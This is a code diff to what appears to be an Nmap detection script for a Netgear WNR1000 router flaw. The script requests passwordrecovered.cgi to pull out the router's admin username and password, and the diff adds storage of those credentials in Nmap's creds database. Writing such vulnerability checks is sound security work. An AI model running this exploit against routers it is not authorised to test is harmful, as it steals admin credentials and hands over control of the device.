@@ -3,6 +3,7 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
 local vulns = require "vulns"
+local creds = require "creds"
 
 description = [[
 A vulnerability has been discovered in WNR 1000 series that allows an attacker
@@ -67,13 +68,17 @@ action = function(host, port)
 
     local detection_session = http.get(host, port, uri)
 
-    if detection_session then
+    if detection_session.status then
+      if not detection_session.body then
+        stdnse.debug1("No response body")
+        return vuln_report:make_output(vuln)
+      end
         -- gather the id
         local id_netgear = string.match(escape(detection_session.body), ('(id=%d+)'))
 
         if id_netgear == nil then
-            stdnse.debug1("Unable to obtain the id")
-            return
+          stdnse.debug1("Unable to obtain the id")
+          return vuln_report:make_output(vuln)
         else
             -- send the payload to get username and password
             local payload_session = http.post(host, port, uri .. "passwordrecovered.cgi?" .. id_netgear, { no_cache = true }, nil, "")
@@ -81,9 +86,13 @@ action = function(host, port)
                 local netgear_username = string.match(escape(payload_session.body), 'Router Admin Username</td>.+align="left">(.+)</td>.+Router Admin')
                 local netgear_password = string.match(escape(payload_session.body), 'Router Admin Password</td>.+align="left">(.+)</td>.+MNUText')
                 if (netgear_username ~= nil and netgear_password ~= nil) then
-                    stdnse.debug1("username : %s", escape(netgear_username))
-                    stdnse.debug1("password : %s", escape(netgear_password))
-                    vuln.state = vulns.STATE.VULN
+                  vuln.exploit_results = {
+                    ("username: %s"):format(netgear_username),
+                    ("password: %s"):format(netgear_password),
+                  }
+                  local c = creds.Credentials:new(SCRIPT_NAME, host, port)
+                  c:add(netgear_username, netgear_password, creds.State.VALID)
+                  vuln.state = vulns.STATE.VULN
                 else
                     stdnse.debug1("We haven't been able to get username/password")
                 end
